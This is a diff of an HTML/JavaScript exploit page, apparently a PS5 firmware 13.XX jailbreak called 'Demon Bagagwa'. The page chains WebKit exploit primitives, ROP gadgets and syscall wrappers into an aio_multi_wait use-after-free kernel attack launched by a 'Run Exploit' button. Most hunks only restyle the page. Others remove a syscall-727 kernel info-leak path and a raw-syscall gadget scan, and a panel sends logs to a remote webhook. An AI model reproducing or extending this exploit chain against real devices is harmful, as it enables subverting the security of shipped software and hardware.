@@ -5,76 +5,77 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Demon Bagagwa — PS5 13.XX</title>
 <style>
-  html, body { margin: 0; padding: 0; min-height: 100%; background: #0a0a0e; color: #e8e0f0; }
+  /* Natural dark theme — flat charcoal, no glow, fast on PS5. */
+  html, body { margin: 0; padding: 0; min-height: 100%; background: #16140f; color: #e6e1d3; }
   body {
     box-sizing: border-box; min-height: 100vh;
     font: 14px/1.5 Consolas, "Courier New", monospace;
     padding: 20px 16px 32px; display: flex; flex-direction: column; align-items: center;
-    background: #0a0a0e;
+    background: #16140f;
   }
   .shell { width: 100%; max-width: 860px; display: flex; flex-direction: column; gap: 12px; }
   .brand {
     text-align: center; padding: 16px 14px 10px;
-    background: #141018; border: 1px solid #2a1620; border-radius: 10px;
+    background: #1e1b15; border: 1px solid #2e2b24; border-radius: 4px;
   }
   .brand h1 {
-    margin: 0; font: 700 28px/1 sans-serif; letter-spacing: .06em; text-transform: uppercase;
-    color: #ff3b3b;
+    margin: 0; font: 700 26px/1 Georgia, "Times New Roman", serif; letter-spacing: .04em;
+    color: #e6e1d3;
   }
-  .brand h1 span { color: #ff1a1a; }
-  .sub { margin: 4px 0 0; color: #9a8bb0; font-size: 11px; letter-spacing: .1em; text-transform: uppercase; }
-  .sub em { color: #ffb3b3; font-style: normal; }
-  #buildver { color: #7a6a90 !important; opacity: .8; font-size: 11px !important; }
+  .brand h1 span { color: #e08a3c; font-style: italic; }
+  .sub { margin: 4px 0 0; color: #8f897a; font-size: 11px; letter-spacing: .1em; text-transform: uppercase; }
+  .sub em { color: #e0914f; font-style: normal; }
+  #buildver { color: #8f897a !important; opacity: .8; font-size: 11px !important; }
   #status {
-    font: 700 13px/1.3 sans-serif; padding: 10px 12px; border-radius: 6px;
-    border: 1px solid #2a2a3a; background: #141420;
-    border-left: 4px solid #5e81ac;
+    font: 700 13px/1.3 sans-serif; padding: 10px 12px; border-radius: 3px;
+    border: 1px solid #2e2b24; background: #1e1b15;
+    border-left: 4px solid #7fa3c4;
   }
-  #status.ok { background: #0f1f14; border-left-color: #22c55e; color: #b6f0c6; }
-  #status.fail { background: #1f0f12; border-left-color: #ff1a1a; color: #ffd0d0; }
-  #status.run { border-left-color: #f59e0b; color: #fde68a; }
+  #status.ok { background: #2b2015; border-left-color: #d98e4a; color: #e8b57c; }
+  #status.fail { background: #2b1a15; border-left-color: #d0684d; color: #e0917a; }
+  #status.run { background: #2a2317; border-left-color: #d0a04a; color: #d9b76a; }
   #log {
-    width: 100%; font-size: 12px; line-height: 1.45; color: #c8c0d8;
-    background: #141018; border: 1px solid #2a1a2a; border-radius: 8px;
+    width: 100%; font-size: 12px; line-height: 1.45; color: #d9d4c5;
+    background: #1e1b15; border: 1px solid #2e2b24; border-radius: 4px;
     padding: 10px; overflow-y: auto; max-height: 52vh; white-space: pre-wrap; box-sizing: border-box;
   }
-  .stage-hdr { color: #ff6b6b; font-weight: 700; }
-  .step { color: #a8d896; } .err { color: #ff4d4d; } .info { color: #7fb7ff; } .warn { color: #ffb86b; }
+  .stage-hdr { color: #e0914f; font-weight: 700; }
+  .step { color: #d99a55; } .err { color: #d0684d; } .info { color: #7fa3c4; } .warn { color: #d0a04a; }
   #btn {
-    width: 100%; padding: 13px 16px; font: 700 13px/1 sans-serif; letter-spacing: .1em; text-transform: uppercase;
-    background: #b50a0a; color: #fff; border: 1px solid #6a0a0a; border-radius: 8px; cursor: pointer;
+    width: 100%; padding: 13px 16px; font: 700 13px/1 Verdana, sans-serif; letter-spacing: .18em; text-transform: uppercase;
+    background: #e6e1d3; color: #16140f; border: none; border-radius: 2px; cursor: pointer;
   }
-  #btn:hover { background: #d01010; }
-  #btn:active { background: #8a0808; }
+  #btn:hover { background: #e0914f; }
+  #btn:active { background: #cfc9b8; }
   #btn:disabled { opacity: .45; cursor: default; }
-  #btnClear { border-radius: 6px !important; font-size: 12px !important; }
-  #logtools { background: #141018 !important; border-color: #2a1a2a !important; border-radius: 8px !important; }
-  #logtools input { background: #0a0a0e !important; border-color: #2a1a2a !important; border-radius: 6px !important; }
-  #logtools button { background: #1a1014; border: 1px solid #3a1a20; color: #e8c0c0; border-radius: 6px; padding: 5px 9px; cursor: pointer; font: 600 11px sans-serif; }
-  #logtools button:hover { background: #2a1620; }
+  #btnClear { border-radius: 3px !important; font-size: 12px !important; }
+  #logtools { background: #1e1b15 !important; border-color: #2e2b24 !important; border-radius: 4px !important; color: #8f897a !important; }
+  #logtools input { background: #16140f !important; border-color: #2e2b24 !important; color: #e6e1d3 !important; border-radius: 3px !important; }
+  #logtools button { background: #1e1b15; border: 1px solid #2e2b24; color: #e6e1d3; border-radius: 3px; padding: 5px 9px; cursor: pointer; font: 600 11px sans-serif; }
+  #logtools button:hover { background: #2b2015; border-color: #d98e4a; }
 </style>
 </head>
 <body>
 <div class="shell">
   <div class="brand">
     <h1><span>DEMON</span> BAGAGWA</h1>
-    <p class="sub"><em>aio_multi_wait</em> mode 0 UAF · syscall 727 leak · osem refcount</p>
-    <p class="sub" id="buildver">build: Demon · PS5 13.XX</p>
+    <p class="sub"><em>aio_multi_wait</em> mode 0 UAF · osem refcount · thread-hunt leak</p>
+    <p class="sub" id="buildver">build: ZiZ · PS5 13.XX</p>
   </div>
 
 <div id="status">waiting for WebKit exploit primitives...</div>
 <button id="btn" disabled>Run Exploit</button>
 <button id="btnClear" style="margin:8px 0;padding:6px 16px;font-size:12px;
-  background:#1a0f14;border:1px solid #5a1a1a;border-radius:6px;color:#e8c0c0;
+  background:#1e1b15;border:1px solid #2e2b24;border-radius:3px;color:#e6e1d3;
   cursor:pointer;display:none;" onclick="try{localStorage.removeItem('bgw_log')}catch(e){}
   document.getElementById('crashlog').style.display='none';
   this.style.display='none';">Clear saved log</button>
 <div id="log"></div>
 <div id="logtools" style="width:100%;max-width:800px;box-sizing:border-box;margin-top:10px;
-  background:#141018;border:1px solid #2a1a2a;border-radius:6px;padding:10px;font-size:12px;color:#9a8bb0;">
+  background:#1e1b15;border:1px solid #2e2b24;border-radius:4px;padding:10px;font-size:12px;color:#8f897a;">
   <div style="margin-bottom:6px;">Remote log server (optional): logs auto-POST here, so a PS5 crash/reload loses nothing.</div>
   <input id="logurl" placeholder="https://... (or ?log=https://...)"
-    style="width:100%;box-sizing:border-box;padding:6px;background:#0a0a0e;color:#cfe3ff;border:1px solid #2a1a2a;border-radius:4px;" />
+    style="width:100%;box-sizing:border-box;padding:6px;background:#16140f;color:#e6e1d3;border:1px solid #2e2b24;border-radius:3px;" />
   <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">
     <button id="btnLogSave">Save endpoint</button>
     <button id="btnLogTest">Send test</button>
@@ -86,9 +87,9 @@
   </div>
   <div style="margin-top:4px;opacity:.7;">Tip: <code>?log=https://webhook.site/YOUR-ID</code> or PC <code>http://192.168.x.x:8000</code></div>
 </div>
-<div id="crashlog" style="display:none;background:#1a0f00;border:1px solid #5a3000;
-  border-radius:6px;padding:10px;margin-top:10px;width:100%;max-width:800px;
-  box-sizing:border-box;font-size:12px;color:#ffcc80;white-space:pre-wrap;
+<div id="crashlog" style="display:none;background:#2a2317;border:1px solid #4a3d1e;
+  border-radius:4px;padding:10px;margin-top:10px;width:100%;max-width:800px;
+  box-sizing:border-box;font-size:12px;color:#d9b76a;white-space:pre-wrap;
   max-height:30vh;overflow-y:auto;"></div>
 
 <script>
@@ -356,8 +357,8 @@ async function watchdog(promise, what) {
 async function sys(num, a, b, c, d, e, f) {
     if (chainDead) throw new Error("sys: chain dead");
     const hasStub = P.syscalls[num] !== undefined;
-    if (!hasStub && !P.rawSyscall)
-        throw new Error("sys: 0x" + num.toString(16) + " no stub and no raw-syscall");
+    if (!hasStub)
+        throw new Error("sys: 0x" + num.toString(16) + " has no libkernel stub (raw path removed with 727)");
     syscallCount++;
     state.syscallsIssued.add(num);
     const callPromise = hasStub
@@ -437,15 +438,8 @@ async function aioGate() {
             log("[gate] " + c[0] + " -> THREW " + (e.message || e), "warn");
         }
     }
-    // 727 (0x2D7) has no libkernel C stub: needs the raw-syscall path.
-    try {
-        const r = await sys(0x2D7, 1, 0, 0);
-        log("[gate] aio_debug727(1,NULL) -> " + (r.failed ? r.errText : "ok"),
-            r.failed ? "warn" : "info");
-    } catch (e) {
-        log("[gate] aio_debug727(1,NULL) -> unavailable (" + (e.message || e)
-            + ") - 727 leak channel OFF, detection falls back to osem probe", "warn");
-    }
+    // [727-removed] no 727 probe — the debug-info leak is fully removed.
+    log("[gate] 727 leak channel: removed from this build (thread-hunt replaces it)", "info");
     return viva > 0;
 }
 
@@ -599,8 +593,7 @@ async function init() {
 
         log("chain operational, pid=" + pid.s32 +
             " gadgets=" + Object.keys(P.gadgets).length +
-            " syscalls=" + Object.keys(P.syscalls).length +
-            " raw=deferred(scan on Run Exploit)", "step");
+            " syscalls=" + Object.keys(P.syscalls).length, "step");
         try { await psNotify("Bagagwa: WebKit OK pid=" + pid.s32); } catch(e) {}
         setStatus("ready — press Run Exploit", "");
         btnEl.disabled = false;
@@ -636,11 +629,10 @@ async function runExploit(fromChain) {
 
         const engine = makeBagagwaEngine(ctx);
 
-        // Raw-syscall gadget scan runs HERE (after WebKit settled), never in
-        // prepare() at WebKit-finish — that is where the heap is tightest.
-        try { if (typeof P.scanRawGadgets === "function") P.scanRawGadgets(); } catch (e) {}
-        log("raw syscall path: " + (P.rawSyscall ? "available (syscall;ret found)" : "NOT found"),
-            P.rawSyscall ? "step" : "warn");
+        // [727-removed] raw-syscall gadget scan REMOVED — it churned ~500K
+        // int64 objects in one synchronous loop at Run-click and caused the
+        // instant "not enough free memory" crash on the button.
+        log("raw syscall path: removed with 727 (all chain syscalls have stubs)", "info");
 
         log("\n--- Stage 0: aio_multi_wait UAF ---\n", "stage-hdr");
         const s0 = await engine.stage0_uaf();
